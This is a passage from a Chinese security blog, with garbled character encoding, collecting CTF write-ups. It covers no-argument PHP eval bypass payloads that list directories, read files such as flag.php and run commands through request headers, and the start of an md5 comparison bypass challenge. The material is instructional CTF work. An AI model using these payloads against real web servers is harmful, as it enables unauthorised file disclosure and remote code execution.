class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> chr(<span class="number">61</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>; <span class="comment">// åè¿›åˆ¶</span></span><br><span class="line"><span class="keyword">echo</span> chr(<span class="number">061</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>; <span class="comment">// å…«è¿›åˆ¶å€¼</span></span><br><span class="line"><span class="keyword">echo</span> chr(<span class="number">0x61</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>; <span class="comment">// åå…­è¿›åˆ¶å€¼</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>=<br>1<br>a<br></p></blockquote><h3 id="chdir"><a href="#chdir" class="headerlink" title="chdir()"></a>chdir()</h3><p><code>chdir()</code> å‡½æ•°å½“å‚æ•°ä¸ºä¸¤ä¸ªç‚¹çš„æ—¶å€™èƒ½å¤Ÿè·³è½¬åˆ°ä¸Šå±‚ç›®å½•ï¼Œç›¸å½“äºåœ¨å‘½ä»¤è¡Œè¾“å…¥cd..ä¼šè¿”å›ä¸Šä¸€çº§ç›®å½•ã€‚</p><p>DOSçš„Chdirï¼ˆcdï¼‰å‘½ä»¤å¯ä»¥æ˜¾ç¤ºå½“å‰ç›®å½•çš„åç§°æˆ–è€…æ›´æ”¹å½“å‰çš„ç›®å½•ã€‚</p><p>ä¸€èˆ¬å½“å‰æ˜¾ç¤ºçš„è·¯å¾„æ˜¯â€C:\Users\Administratorâ€ï¼Œå¦‚æœæƒ³è¦è·³è½¬åˆ°Dç›˜çš„Testæ–‡ä»¶å¤¹(â€œD:\test\â€)å¯ä»¥ç›´æ¥ä½¿ç”¨DOSå‘½ä»¤<strong>cd /d d:\test</strong></p><p>å¦‚æœæƒ³è¦è·³è½¬åˆ°å½“å‰è·¯å¾„çš„ä¸Šä¸€çº§è·¯å¾„å¯ä»¥ç›´æ¥ç”¨DOSå‘½ä»¤<strong>cd ..</strong></p><p>å¦‚æœæƒ³è¦è·å–cdå‘½ä»¤çš„å…·ä½“ç”¨æ³•ï¼Œå¯ä»¥ç›´æ¥è¾“å…¥<strong>cd /?</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> getcwd().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">chdir(<span class="string">&quot;app&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> getcwd().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> getcwd().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>D:\phpStudy\PHPTutorial\WWW<br>D:\phpStudy\PHPTutorial\WWW\app<br>D:\phpStudy\PHPTutorial\WWW</p></blockquote><h3 id="localtime"><a href="#localtime" class="headerlink" title="localtime()"></a>localtime()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localtime(timestamp,is_assoc);</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>timestamp</em></td><td align="left">å¯é€‰ã€‚è§„å®š Unix æ—¶é—´æˆ³ã€‚å¦‚æœæœªè§„å®š <em>timestamp</em>ï¼Œåˆ™é»˜è®¤ä¸ºå½“å‰çš„æœ¬åœ°æ—¶é—´ time()ã€‚</td></tr><tr><td align="left"><em>is_assoc</em></td><td align="left">å¯é€‰ã€‚è§„å®šè¿”å›å…³è”æ•°ç»„è¿˜æ˜¯ç´¢å¼•æ•°ç»„ã€‚å¦‚æœä¸º FALSEï¼Œåˆ™è¿”å›ç´¢å¼•æ•°ç»„ã€‚å¦‚æœä¸º TRUEï¼Œåˆ™è¿”å›å…³è”æ•°ç»„ã€‚é»˜è®¤ä¸º FALSEã€‚å…³è”æ•°ç»„çš„é”®åå¦‚ä¸‹ï¼š[tm_sec] - ç§’æ•°[tm_min] - åˆ†é’Ÿæ•°[tm_hour] - å°æ—¶[tm_mday] - æœˆä»½ä¸­çš„ç¬¬å‡ å¤©[tm_mon] - å¹´ä»½ä¸­çš„ç¬¬å‡ ä¸ªæœˆï¼Œä» 0 å¼€å§‹è¡¨ç¤ºä¸€æœˆä»½[tm_year] - å¹´ä»½ï¼Œä» 1900 å¼€å§‹[tm_wday] - æ˜ŸæœŸä¸­çš„ç¬¬å‡ å¤© (Sunday=0)[tm_yday] - å¹´ä¸­çš„ç¬¬å‡ å¤©[tm_isdst] - å¤ä»¤æ—¶å½“å‰æ˜¯å¦ç”Ÿæ•ˆ</td></tr></tbody></table><br><h2 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/07/19/UfZFsK.png" alt="UfZFsK.png"></p><h3 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h3><p>å¯ä»¥åˆ©ç”¨<code>eval()</code>è¯»å–ç›®å½•</p><ul><li>ç”¨scandir()è¯»å–ç›®å½•æºç ï¼Œä½†å¿…é¡»å¸¦æœ‰å‚æ•°ï¼ˆâ€™.â€™ï¼‰ï¼Œæ— æ³•é€šè¿‡æ­£åˆ™åŒ¹é…</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(scandir(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/07/20/UflsPO.png" alt="UflsPO.png"></p><ul><li>ç”¨pos()å–localeconv()è¿”å›çš„æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä¹Ÿå°±æ˜¯â€.â€</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(scandir(pos(localeconv())));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/07/20/Ufloi8.png" alt="Ufloi8.png"></p><p><code>code.php?code=var_dump(scandir(pos(localeconv())));</code></p><p><img src="https://s1.ax1x.com/2020/07/20/Uflvd0.png" alt="Uflvd0.png"></p><ul><li>ç”¨end()é€‰æ‹©æœ€åä¸€ä¸ªæ–‡ä»¶å¹¶ç”¨readfile()è¯»å–</li></ul><p><code>code.php?code=var_dump(readfile(end(scandir(pos(localeconv())))));</code></p><blockquote><p>readfile()   è¾“å‡ºä¸€ä¸ªæ–‡ä»¶</p><p>show_source() ä¸ echo(readfile())æ•ˆæœä¸€æ ·ï¼Œå¯ä»£æ›¿ä½¿ç”¨ã€‚</p></blockquote><p><img src="https://s1.ax1x.com/2020/07/20/Uf1kLR.png" alt="Uf1kLR.png"></p><h3 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h3><p>åˆ©ç”¨å½“å‰ç§’æ•°æ„é€ ç‚¹  ï¼Œåˆ©ç”¨localtime()ä¸­è¿”å›çš„ç§’æ•°æ¥æ„é€ ç‚¹ï¼Œç‚¹çš„aiiscç æ­£å¥½æ˜¯46åœ¨60ç§’ä¹‹å†…ï¼Œæˆ‘ä»¬åªéœ€ç­‰åˆ°46ç§’æ—¶å€™å°±èƒ½å°†ç‚¹ç»™æ„é€ å‡ºæ¥ã€‚</p><ul><li>chr(current(localtime(time())))</li></ul><p>åˆ©ç”¨chr(46)å°±æ˜¯å­—ç¬¦<code>.</code></p><p>æ•°ç»„ç¬¬ä¸€ä¸ªå€¼æ¯ç§’+1ï¼Œæ‰€ä»¥æœ€å¤š60ç§’å°±ä¸€å®šèƒ½å¾—åˆ°46</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(chr(pos(localtime())));</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.107.126.173:8080&#x2F;code&#x2F;code.php? code&#x3D;var_dump(readfile(end(scandir(chr(pos(localtime()))))));</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•ä¸‰"><a href="#æ–¹æ³•ä¸‰" class="headerlink" title="æ–¹æ³•ä¸‰"></a>æ–¹æ³•ä¸‰</h3><p>åˆ©ç”¨SESSIONIDæ¥ä¼ å‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure><p>åœ¨cookieå¤„ä¼ å‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHPSESSID&#x3D;flag.php</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/07/20/Uf1UfS.png" alt="Uf1UfS.png"></p><p><img src="https://s1.ax1x.com/2020/07/20/U4hJsS.png" alt="U4hJsS.png"></p><h3 id="æ–¹æ³•å››"><a href="#æ–¹æ³•å››" class="headerlink" title="æ–¹æ³•å››"></a>æ–¹æ³•å››</h3><p>åˆ©ç”¨ getallheaders() æ¥è·å–å‚æ•°RCE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(system(end(getallheaders()))); </span><br></pre></td></tr></table></figure><p>åœ¨æœ€ååœ¨æœ€åä¸€æ¡è¯·æ±‚å¤´æ·»åŠ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.php</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/08/17/dZ78KO.png" alt="dZ78KO.png"></p><br><h2 id="è¯»å–ç›®å½•æ–‡ä»¶"><a href="#è¯»å–ç›®å½•æ–‡ä»¶" class="headerlink" title="è¯»å–ç›®å½•æ–‡ä»¶"></a>è¯»å–ç›®å½•æ–‡ä»¶</h2><ul><li>å¦‚æœæ–‡ä»¶æ˜¯æœ€åä¸€ä¸ªï¼Œå¯ä»¥ç”¨</li></ul><p><code>show_source(end(scandir(getcwd())));</code></p><blockquote><p>æˆ–è€…ç”¨<code>readfile()</code>ã€<code>highlight_file()</code>ã€<code>file_get_contents()</code>ã€<code>readgzfile()</code>ç­‰è¯»æ–‡ä»¶å‡½æ•°</p></blockquote><ul><li>å¦‚æœæ–‡ä»¶æ˜¯å€’æ•°ç¬¬äºŒä¸ªï¼Œå¯ä»¥ç”¨</li></ul><p><code>show_source(next(array_reverse(scandir(getcwd()))));</code></p><blockquote><p><code>array_reverse()</code>ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„</p></blockquote><ul><li>å¦‚æœä¸æ˜¯æ•°ç»„çš„æœ€åä¸€ä¸ªæˆ–è€…å€’æ•°ç¬¬äºŒä¸ªï¼Œå¯ä»¥ç”¨</li></ul><p><code>show_source(array_rand(array_flip(scandir(getcwd()))));</code></p><p>æˆ–è€…ï¼š</p><p><code>show_source(array_rand(array_flip(scandir(current(localeconv())))));</code></p><blockquote><p><code>array_flip()</code>å‡½æ•°ä¼šäº¤æ¢æ•°ç»„çš„é”®åå’Œé”®å€¼ï¼Œ<code>array_rand()</code>å‡½æ•°ä¼šè¿”å›æ•°ç»„ä¸­çš„éšæœºé”®å</p></blockquote><br><h2 id="è·³è½¬ç›®å½•æƒ…å†µ"><a href="#è·³è½¬ç›®å½•æƒ…å†µ" class="headerlink" title="è·³è½¬ç›®å½•æƒ…å†µ"></a>è·³è½¬ç›®å½•æƒ…å†µ</h2><ul><li><p>å‡è®¾ï¬‚agåœ¨ä¸Šå±‚ç›®å½•æ–‡ä»¶çš„æƒ…å†µï¼Œæˆ‘ä»¬éœ€è¦è·³è½¬åˆ°ä¸Šå±‚ç›®å½•ã€‚ </p></li><li><p><code>chdir()</code> å‡½æ•°å½“å‚æ•°ä¸ºä¸¤ä¸ªç‚¹çš„æ—¶å€™èƒ½å¤Ÿè·³è½¬åˆ°ä¸Šå±‚ç›®å½•ã€‚<code>scandir()</code> ï¼Œè¯»å–å½“å‰ç›®å½•åœ¨ç¬¬äºŒä¸ªå…ƒç´ å°±èƒ½è¯»å–ä¸¤ä¸ªç‚¹</p></li><li><p><code>localtime</code>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ—¶é—´æˆ³ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥åµŒå¥—ï¼Œéœ€è¦å¸¦ä¸€ä¸ªtimeå‡½æ•°ä½œä¸ºåµŒå¥—ã€timeå‡½æ•°èƒ½å¤Ÿè¿”å›æ—¶é—´æˆ³ </p></li><li><p>æ„é€ è¯»å–ä¸Šå±‚ç›®å½•payload</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(implode(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))));</span><br></pre></td></tr></table></figure><ul><li>æ„é€ è¯»å–ä¸Šå±‚ç›®å½•æ–‡ä»¶payload</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure><br><h2 id="å…¶å®ƒå°æŠ€å·§"><a href="#å…¶å®ƒå°æŠ€å·§" class="headerlink" title="å…¶å®ƒå°æŠ€å·§"></a>å…¶å®ƒå°æŠ€å·§</h2><ul><li>åˆ©ç”¨chr(46)å°±æ˜¯å­—ç¬¦<code>.</code></li></ul><p>phpversion()ä¼šè¿”å›phpç‰ˆæœ¬ï¼Œå¦‚<code>5.6.27</code></p><p><code>floor(phpversion())</code>è¿”å›<code>5</code></p><p><code>sqrt(floor(phpversion()))</code>è¿”å›<code>2.2360679774998</code></p><p><code>tan(floor(sqrt(floor(phpversion()))))</code>è¿”å›<code>-2.1850398632615</code></p><p><code>cosh(tan(floor(sqrt(floor(phpversion())))))</code>è¿”å›<code>4.5017381103491</code></p><p><code>sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code>è¿”å›<code>45.081318677156</code></p><p><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>è¿”å›<code>46</code></p><p>å³ï¼š<code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>ç­‰äº<code>.</code></p><ul><li>åˆ©ç”¨ä¸‰è§’å‡½æ•°æ„é€ æ–œæ </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile())))))))));</span><br></pre></td></tr></table></figure><ul><li>åˆ©ç”¨éšæœºä»¤ç‰Œæ„é€ ç‚¹</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(implode(scandir(chr(strrev(uniqid())))));</span><br></pre></td></tr></table></figure><ul><li>æŸ¥çœ‹ä¸Šä¸€çº§ç›®å½•æ–‡ä»¶å</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(dirname(getcwd())));</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(next(scandir(getcwd()))));</span><br></pre></td></tr></table></figure><br><h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">$a=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ses|pos|end|next|name|chdir|var|impolode|tan|tall|sys|eval|var|high|show|read|base|url|print/i&quot;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;\$a=&quot;</span>.$_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/&#x27;</span>, $a))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span>($a);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h3 id="ä»£ç åˆ†æ-1"><a href="#ä»£ç åˆ†æ-1" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><p>é¦–å…ˆå¯¹ä¼ è¿›æ¥çš„codeè¿›è¡Œè¿‡æ»¤ï¼Œè‹¥æ˜¯é€šè¿‡æ›¿æ¢åä¸º<code>;</code>ï¼Œåˆ™èƒ½é€šè¿‡ç¬¬ä¸€ä¸ªifåˆ¤æ–­è¯­å¥ï¼Œæ‰€ä»¥è¦å¥—å¨ƒåµŒå¥—</p><p>ç¬¬äºŒä¸ªifè¯­å¥å¯¹å±é™©å‡½æ•°è¿›è¡Œè¿‡æ»¤ï¼ŒåŒ…æ‹¬å¤§å°å†™ï¼Œæ‰€ä»¥åªèƒ½ç”¨æ²¡è¢«è¿‡æ»¤çš„å‡½æ•°æ¥æ„é€ payload</p><p>eval()è¯­å¥æ‰§è¡Œä¼ è¿›æ¥çš„codeï¼Œç„¶åèµ‹å€¼ç»™<code>$a</code></p><p>ç¬¬ä¸‰ä¸ªifè¯­å¥å¯¹$aè¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœå«æœ‰<code>flag</code>ï¼Œåˆ™dieæ‰</p><p>ç»•è¿‡äº†å‰é¢3ä¸ªifè¯­å¥ï¼Œåˆ™é€šè¿‡echo($a)ï¼Œå°†codeæ‰§è¡Œåçš„ç»“æœè¾“å‡º</p><h3 id="æ„é€ payload"><a href="#æ„é€ payload" class="headerlink" title="æ„é€ payload"></a>æ„é€ payload</h3><p>ç”¨<code>file_get_contents()</code>å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œåˆ©ç”¨eval()èµ‹å€¼ç»™$aï¼Œæœ€åé€šè¿‡echo()æ‰“å°å‡ºæ¥</p><p>å› ä¸ºä¸çŸ¥é“flag.phpçš„ä½ç½®ï¼Œä¸”è¿‡æ»¤æ‰å¾ˆå¤šå‡½æ•°ï¼Œå¦‚ï¼šend()ã€next()ç­‰</p><p>æ‰€ä»¥ç”¨<code>array_rand(array_flip())</code>æ¥è·å–ä¸€ä¸ªéšæœºçš„æ–‡ä»¶å</p><p>åˆèµ·æ¥å°±æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p>ä½†åè¾¹å¯¹$aè¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œè¿‡æ»¤äº†<code>flag</code>ï¼Œæ‰€ä»¥è¦å¯¹è¯»å–çš„æ–‡ä»¶å†…å®¹åŠ å¯†ï¼Œç”±äºè¿‡æ»¤äº†base64ï¼Œæ‰€ä»¥é€‰æ‹©ç”¨åå…­è¿›åˆ¶åŠ å¯†ï¼Œå¾—åˆ°æœ€ç»ˆpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin2hex(file_get_contents(array_rand(array_flip(scandir(current(localeconv()))))));</span><br></pre></td></tr></table></figure><p>å› ä¸ºæ˜¯éšæœºè¯»å–ï¼Œæ‰€ä»¥è¦å¤šåˆ·æ–°å‡ æ¬¡ï¼Œç„¶åè§£å¯†çœ‹çœ‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> hex2bin(<span class="string">&quot;3c3f7068700d0a2f2f666c61677b36643633333362392d353564302d343266312d613236642d3663666439663361666238657d0d0a3f3e&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><?php//flag{6d6333b9-55d0-42f1-a26d-6cfd9f3afb8e}?></blockquote>]]></content>
      
      
      <categories>
          
          <category> ä¿¡æ¯å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬å››å±ŠHECTF write up</title>
      <link href="2020/11/22/%E7%AC%AC%E5%9B%9B%E5%B1%8AHECTF%20write%20up/"/>
      <url>2020/11/22/%E7%AC%AC%E5%9B%9B%E5%B1%8AHECTF%20write%20up/</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><p>é¢˜ç›®ï¼šè›¾å­ï¼ä½ æ€ä¹ˆè·‘åˆ°äº†ã€‚ã€‚ã€‚ã€‚phpä¸Šï¼Ÿ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>); </span><br><span class="line">$string_1 = $_GET[<span class="string">&#x27;str1&#x27;</span>]; </span><br><span class="line">$string_2 = $_GET[<span class="string">&#x27;str2&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;param1&#x27;</span>]!==$_GET[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5($_GET[<span class="string">&#x27;param1&#x27;</span>])===md5($_GET[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($string_1))&#123; </span><br><span class="line">        $md5_1 = md5($string_1); </span><br><span class="line">        $md5_2 = md5($string_2); </span><br><span class="line">        <span class="keyword">if</span>($md5_1 != $md5_2)&#123; </span><br><span class="line">            $a = strtr($md5_1, <span class="string">&#x27;cxhp&#x27;</span>, <span class="string">&#x27;0123&#x27;</span>); </span><br><span class="line">            $b = strtr($md5_2, <span class="string">&#x27;cxhp&#x27;</span>, <span class="string">&#x27;0123&#x27;</span>); </span><br><span class="line">            <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;you are close&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;md5 is wrong&quot;</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;str1 not number&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are wrong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><a id="more"></a><p>åˆ©ç”¨md5()ä¸èƒ½åŠ å¯†æ•°ç»„ï¼ŒåŠ å¯†æ•°ç»„ä¼šè¿”å›falseï¼Œæ‰€ä»¥<code>param1</code>å’Œ<code>param2</code>ä¼ å€¼ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]&#x3D;1&amp;param2[]&#x3D;2</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹è¦ä½¿å¾—ä¼ è¿›æ¥çš„<code>str1</code>æ˜¯çº¯æ•°å­—ï¼Œä¸”<code>str1</code>å’Œ<code>str2</code>è¿›è¡Œmd5åŠ å¯†åçš„å€¼ä¸ç›¸ç­‰</p><p>ç„¶åå¯¹md5åŠ å¯†åçš„å€¼è¿›è¡Œæ›¿æ¢åç›¸ç­‰ï¼Œæœ€ç»ˆå¾—åˆ°flag</p><br><p>åªè¦æ˜¯ä»¥0eå¼€å¤´ï¼Œåé¢ä¸ºæ•°å­—çš„ä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰ï¼Œæ‰€ä»¥</p><p><code>$a == $b</code>è¿™é‡Œå¯ä»¥è€ƒè™‘è¿™æ ·ç»•è¿‡</p><p>çº¯æ•°å­—çš„å­—ç¬¦ä¸²md5åŠ å¯†åç¬¦åˆ**<code>0e\d+</code>**çš„æœ‰<code>240610708</code>ï¼Œå³</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str1&#x3D;240610708</span><br></pre></td></tr></table></figure><p>å› ä¸ºåœ¨åé¢çš„æ›¿æ¢ä¸­ï¼Œä¼šå°†<code>c</code>æ›¿æ¢ä¸º<code>0</code>ï¼Œæ‰€ä»¥<code>str2</code>è¿›è¡Œmd5åŠ å¯†åå¾—ä»¥<code>ce</code>å¼€å¤´ï¼Œè¿™æ ·æ‰èƒ½ä½¿å¾—<code>str1</code>å’Œ<code>str2</code>md5åŠ å¯†åçš„å€¼ä¸ç›¸ç­‰ï¼Œæ›¿æ¢ååˆèƒ½ç›¸ç­‰</p><p>è€Œ<code>str2</code>è¿›è¡Œmd5åŠ 